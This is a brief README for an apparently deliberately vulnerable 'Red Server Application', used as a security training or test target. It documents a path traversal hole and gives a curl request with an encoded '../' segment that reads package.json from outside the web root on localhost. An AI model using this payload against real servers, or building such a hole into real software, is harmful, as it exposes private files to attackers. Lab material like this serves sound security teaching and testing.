# Red Server Application

Vulnerabilities:
1. Path traversal:
- start server with command: `node server.js`
- try following command: `curl http://127.0.0.1:8000/%2e%2e/package.json`
